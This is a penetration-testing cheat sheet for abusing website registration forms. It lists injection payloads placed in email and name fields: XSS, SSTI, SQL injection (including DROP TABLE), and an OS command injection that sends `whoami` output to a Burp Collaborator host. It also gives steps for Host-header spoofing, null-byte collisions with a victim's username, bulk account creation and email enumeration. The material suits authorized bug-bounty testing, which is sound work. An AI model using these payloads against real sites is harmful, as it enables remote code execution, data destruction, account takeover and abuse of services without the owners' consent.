- Gmail treats `me@gmail.com` and `me+1@gmail.com` as **ONE EMAIL**. We can use this to create Multi-Account on other platform.
- If There Is Google's ReCAPTCHA Try To Configure TLS Pass Through Of Burp Suite e.g.   .*google.com.*

```
Steps to produce :-
1 - Go To Burp Suite Project Configurations
2 - Go To TLS Pass Through
3 - Click Add Then Enter
  .*google.com.*
```

- Try to SIgn Up with Existing Email, Sometimes Authorization Token Will Reflect In Response
- Try:

```
admin@gmail.com@company.com
me+(@gmail.com)@company.com
"me@gmail.com"@company.com
 "<me@gmail.com>"@company.com
"me@gmail.com;"@company.com
"me@gmail.com+"@company.com
admin@googlemail.com@company.com
me+(@googlemail.com)@company.com
"me@googlemail.com"@company.com
 "<me@googlemail.com.com>"@company.com
"me@googlemail.com;"@company.com
"me@googlemail.com+"@company.com
me+(<script>alert(0)</script>)@gmail.com
me(<script>alert(0)</script>)@gmail.com
me@gmail(<script>alert(0)</script>).com
"<script>alert(0)</script>"@gmail.com
"<%= 7 * 7 %>"@gmail.com
me+(${{7*7}})@gmail.com
"' OR 1=1 -- '"@gmail.com
"me); DROP TABLE users;--"@gmail.com
%@gmail.com
me@id.collaborator.net
me@[id.collaborator.net]
user(;me@id.collaborator.net)@gmail.com
me@id.collaborator.net(@gmail.com)
me+(@gmail.com)@id.collaborator.net
<me@id.collaborator.net>user@gmail.com
```

- Sometimes They Ping Your Host Before Sending A Mail So Try To Sign Up By Using Burp Collaborator Mail Address with Injection OS Command To Get RCE.

```
firstname=I&lastname=am&email=me@`whoami`.id.collaborator.net&password=********&captcha=Random&token=CSRF
```

- If Company Accepted admin@company.com As Email Address But You Can't Activate It , Try To Spoof Host Header e.g X-Forwarded-Host OR X-Host
- Try To Insert SSTI Payloads e.g. `{{7*7}}` , `{7*7}` OR `${7*7}` In Username, First Name OR Last Name.
- Try To Insert `<%` In Username , First Name OR Last Name , So If `<%` Reflected In Email Body Try To Inject `<%= 7 * 7 %>` To Get SSTI.
- Try To Set Your Name , First Name , Last Name etc As TRUE, NULL, UNDEFINED etc
- Try To Insert Invisible Range %00 To %FF in Your Email OR Username e.g. Victim's Username is bob , You Can't Register it So Use bob%00 OR %01bob
- Try To Insert Large String 50.000+ Characters OR Numbers in POST Parameters To Cause Errors Exposing Sensitive Information
- Try To Set Password e.g. %01%E2%80%AEalert%0D%0A Then Try To Log In Only Using %01 , Log In Without CRLF And Is trela Accepted Instead Of alert ?
- Try To Do Brute Force To Create Multi Accounts OR Enumerate Email Addresses If The Company Doesn't Send Activation Link To Your Account
- Try To Insert SQLi Payloads e.g. ' AND '1' = '2 OR ";WAITFOR DELAY '0.0.20'--OR Blind XSS In User-Agent
- 